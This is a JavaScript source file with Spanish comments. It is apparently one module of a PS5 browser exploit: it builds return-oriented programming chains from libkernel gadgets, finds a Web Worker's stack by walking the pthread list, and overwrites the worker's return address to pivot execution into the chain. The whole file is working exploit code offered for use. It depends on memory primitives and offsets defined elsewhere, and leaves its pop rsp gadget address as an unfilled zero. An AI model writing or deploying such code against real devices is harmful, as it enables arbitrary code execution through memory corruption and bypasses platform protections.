/**
 * rop.js — Constructor de cadenas ROP y lanzador via Web Worker
 *
 * En PS5 el CFI de Clang protege las llamadas virtuales (forward-edge),
 * pero NO protege el stack de retorno (no hay shadow stack).
 * Explotamos esto sobrescribiendo la dirección de retorno en el stack
 * de un Web Worker para pivotar a nuestra cadena ROP.
 *
 * Flujo:
 *   1. Crear un Worker con un handler postMessage conocido
 *   2. Usar read8() para recorrer la lista de threads de libkernel
 *      y localizar el stack del Worker (tamaño = 0x80000)
 *   3. Sobrescribir [stack + WORKER_RET_OFFSET] con gadget pop rsp ; ret
 *   4. Escribir la cadena ROP en memoria ejecutable
 *   5. Disparar postMessage → el handler retorna → ROP toma control
 */

"use strict";

// ── Clase Chain: construye la cadena ROP ──────────────────────────────────

class ROPChain {
    /**
     * @param {Primitives} p        Objeto de primitivas de memoria
     * @param {Int64}      libkBase Base de libkernel.sprx
     */
    constructor(p, libkBase) {
        this.p       = p;
        this.libkBase = libkBase;
        this.entries = [];          // Array de Int64 (la cadena en orden)
        this._alloc  = null;        // Dirección del buffer ROP en memoria
    }

    /** Resuelve un gadget sumando su offset a la base de libkernel */
    gadget(name) {
        const off = OFFSETS.libkernel["gadget_" + name];
        if (off === undefined) throw new Error(`Gadget desconocido: ${name}`);
        return this.libkBase.add32(off);
    }

    /** Resuelve la dirección de una syscall en libkernel */
    syscall(name) {
        const off = OFFSETS.libkernel["syscall_" + name];
        if (off === undefined) throw new Error(`Syscall desconocida: ${name}`);
        return this.libkBase.add32(off);
    }

    /** Añade un valor (Int64 o número) a la cadena */
    push(val) {
        if (typeof val === 'number') val = new Int64(val);
        this.entries.push(val);
        return this;
    }

    /** Alias legible: push de un gadget */
    pushGadget(name) { return this.push(this.gadget(name)); }

    /** push de una syscall */
    pushSyscall(name) { return this.push(this.syscall(name)); }

    /** push de una constante literal */
    pushConst(hi, lo) { return this.push(new Int64(lo >>> 0, hi >>> 0)); }

    /**
     * Emite: pop rdi ; ret → valor
     * Útil para setear el primer argumento de una llamada
     */
    setRDI(val) {
        this.pushGadget("pop_rdi_ret");
        return this.push(val);
    }

    setRSI(val) { this.pushGadget("pop_rsi_ret"); return this.push(val); }
    setRDX(val) { this.pushGadget("pop_rdx_ret"); return this.push(val); }
    setRCX(val) { this.pushGadget("pop_rcx_ret"); return this.push(val); }
    setR8(val)  { this.pushGadget("pop_r8_ret");  return this.push(val); }
    setR9(val)  { this.pushGadget("pop_r9_ret");  return this.push(val); }

    /**
     * Emite una llamada a una función arbitraria con hasta 6 argumentos.
     * Los argumentos extra (> 6) deben manejarse manualmente en el stack.
     */
    call(fn, ...args) {
        const regs = ['rdi','rsi','rdx','rcx','r8','r9'];
        args.forEach((a, i) => {
            if (i < regs.length) {
                this.pushGadget(`pop_${regs[i]}_ret`);
                this.push(a);
            }
        });
        this.push(fn);
        return this;
    }

    /**
     * Llama a una syscall de libkernel.
     * Las syscalls siguen la misma convención SysV AMD64.
     */
    callSyscall(name, ...args) {
        return this.call(this.syscall(name), ...args);
    }

    /**
     * Añade un bloque de padding (NOPs semánticos = gadget ret).
     * Útil para alinear el stack o rellenar huecos.
     */
    nop(count = 1) {
        for (let i = 0; i < count; i++) this.pushGadget("ret");
        return this;
    }

    /**
     * Finaliza la cadena con un bucle infinito (para no crashear al terminar).
     * También se puede usar un jmp a una dirección de retorno legítima.
     */
    loop() {
        // Simplemente hacemos que pop rsp apunte de vuelta al inicio de la cadena
        this.pushGadget("pop_rsp_ret");
        // La dirección del inicio de la cadena se parchea después de allocar
        this._needsLoopPatch = true;
        return this;
    }

    /**
     * Serializa la cadena ROP a un Uint8Array (little-endian, 8 bytes/entrada).
     * @returns {Uint8Array}
     */
    serialize() {
        const buf = new Uint8Array(this.entries.length * 8);
        const dv  = new DataView(buf.buffer);
        this.entries.forEach((e, i) => {
            dv.setUint32(i * 8,     e.lo, true);
            dv.setUint32(i * 8 + 4, e.hi, true);
        });
        return buf;
    }

    /** Longitud de la cadena en bytes */
    get byteLength() { return this.entries.length * 8; }
}

// ── Funciones para localizar y pivotar el Worker ──────────────────────────

/**
 * Recorre la lista enlazada de pthreads de libkernel para encontrar
 * el thread del Web Worker (identificado por su tamaño de stack = 0x80000).
 *
 * @param {Primitives} p
 * @param {Int64}      libkBase
 * @returns {Int64}  Dirección base del stack del worker, o null si no se encuentra
 */
function findWorkerStack(p, libkBase) {
    const threadListAddr = libkBase.add32(OFFSETS.libkernel.thread_list);
    let thread = p.read8(threadListAddr);

    const NEXT   = OFFSETS.libkernel.pthread_next;
    const STACK  = OFFSETS.libkernel.pthread_stack_addr;
    const STSZ   = OFFSETS.libkernel.pthread_stack_size;
    const TARGET = new Int64(OFFSETS.webkit.worker_stack_size);

    let iterations = 0;
    while ((thread.lo !== 0 || thread.hi !== 0) && iterations < 256) {
        const stackSize = p.read8(thread.add32(STSZ));
        if (stackSize.equals(TARGET)) {
            return p.read8(thread.add32(STACK));
        }
        thread = p.read8(thread.add32(NEXT));
        iterations++;
    }
    return null;
}

/**
 * Lanza una cadena ROP sobrescribiendo el return address en el stack del Worker.
 *
 * @param {Primitives} p
 * @param {ROPChain}   chain      La cadena ya construida y serializada
 * @param {Int64}      chainAddr  Dónde hemos escrito la cadena en memoria
 * @param {Int64}      workerStack Dirección base del stack del Worker
 * @param {Worker}     worker     El objeto Worker de JS
 * @returns {Promise}
 */
function launchROPChain(p, chain, chainAddr, workerStack, worker) {
    const RET_OFFSET   = OFFSETS.webkit.worker_ret_offset;
    const gadgetPopRSP = new Int64(0); // Se rellena desde libkBase en caller

    const retAddrPtr = workerStack.add32(RET_OFFSET);
    const rspPtr     = retAddrPtr.add32(0x8);

    // Escribir el gadget "pop rsp ; ret" en la dirección de retorno del worker
    p.write8(retAddrPtr, gadgetPopRSP);
    // El siguiente valor en el stack será el nuevo RSP → inicio de nuestra cadena
    p.write8(rspPtr, chainAddr);

    // Disparar el handler del Worker para que retorne y active el ROP
    return new Promise((resolve) => {
        const channel = new MessageChannel();
        channel.port1.onmessage = () => {
            channel.port1.close();
            resolve();
        };
        worker.postMessage(0, [channel.port2]);
    });
}

// ── Worker script ─────────────────────────────────────────────────────────
// Este string se usa como fuente del Worker via Blob URL

const WORKER_SCRIPT = `
"use strict";
// Worker mínimo: responde a postMessage para que el ROP pueda dispararse
self.onmessage = function(e) {
    // Notificamos que estamos listos
    if (e.ports && e.ports[0]) {
        e.ports[0].postMessage('ready');
    }
    // La función retorna aquí → return address será nuestro gadget ROP
};
`;

/**
 * Crea y prepara el Web Worker para el ataque.
 * @returns {{worker: Worker, start: Function}}
 */
function createROPWorker() {
    const blob   = new Blob([WORKER_SCRIPT], { type: 'application/javascript' });
    const url    = URL.createObjectURL(blob);
    const worker = new Worker(url);

    // Calentamos el worker con un primer mensaje para estabilizar su stack
    const warmup = new Promise((resolve) => {
        const ch = new MessageChannel();
        ch.port1.onmessage = () => { ch.port1.close(); resolve(); };
        worker.postMessage('warmup', [ch.port2]);
    });

    return { worker, warmup };
}
